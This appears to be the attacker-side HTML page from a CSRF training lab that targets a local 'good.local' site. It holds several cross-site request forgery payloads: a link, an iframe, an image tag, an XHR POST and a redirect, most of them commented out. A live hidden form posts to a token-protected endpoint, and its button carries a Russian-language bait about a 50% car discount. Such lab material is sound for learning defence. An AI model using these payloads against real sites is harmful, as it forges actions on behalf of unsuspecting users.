<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
bad<br><br><br>
<!--<a href="http://good.local/c.php?action=pivo" target="_blank">-->
<!--    Лада Веста по гос программе со скидкой 50%-->
<!--</a>-->

<!--<iframe src="http://good.local/csrf/c.php?action=pivo"></iframe>-->

<!--<img src="http://good.local/csrf/c.php?action=pivo" >-->

<!--<script type="text/javascript">-->
<!--    var xhr = new XMLHttpRequest();-->
<!--    xhr.open('POST', 'http://good.local/csrf/c.php', false);-->
<!--    xhr.send();-->
<!--</script>-->

<form method="post" action="http://good.local/csrf/c_token.php">
    <input type="hidden" name="action" value="pivo">
    <input type="submit" value="Лада Веста по гос программе со скидкой 50%">
</form>

<!--<script type="text/javascript">-->
<!--    location.href = 'http://good.local/csrf/c.php?action=pivo';-->
<!--</script>-->

</body>
</html>
<?php


